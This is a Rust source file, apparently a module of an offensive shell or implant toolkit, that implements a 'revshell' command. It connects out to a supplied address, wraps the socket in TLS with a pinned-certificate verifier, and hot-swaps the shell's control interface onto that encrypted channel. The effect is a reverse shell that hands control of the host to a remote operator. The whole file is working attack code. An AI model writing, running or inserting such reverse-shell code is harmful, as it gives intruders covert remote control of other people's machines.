use clap::{App, Arg, AppSettings};

use ::{Result, Shell, Arguments};
use ctrl::Interface;

use rustls;
use crypto::{self, OwnedTlsStream};
use std::sync::Arc;
use std::net::{TcpStream, SocketAddr};

use bufstream::BufStream;


pub fn revshell(sh: &mut Shell, args: Arguments) -> Result {
    let matches = App::new("revshell")
        .setting(AppSettings::DisableVersion)
        .arg(Arg::with_name("addr").required(true))
        .arg(Arg::with_name("fingerprint").required(true))
        .get_matches_from_safe(args)?;

    let addr: SocketAddr = matches.value_of("addr").unwrap().parse().unwrap(); // TODO: error handling
    let fingerprint = matches.value_of("fingerprint").unwrap();

    let mut config = rustls::ClientConfig::new();
    config.dangerous().set_certificate_verifier(Arc::new(crypto::danger::PinnedCertificateVerification {}));

    let sess = rustls::ClientSession::new(&Arc::new(config), &fingerprint);

    shprintln!(sh, "[*] connecting to {}...", addr);
    let sock = TcpStream::connect(&addr).unwrap(); // TODO: error handling
    shprintln!(sh, "[+] connected!");

    let sock = OwnedTlsStream::new(sess, sock);
    shprintln!(sh, "[+] established encrypted connection"); // TODO: show fingerprint
    let sock = BufStream::new(sock);

    shprintln!(sh, "[*] see you on the other side...");
    sh.hotswap(Interface::Tls(sock));
    shprintln!(sh, "[+] hot-swapped interface");

    Ok(())
}
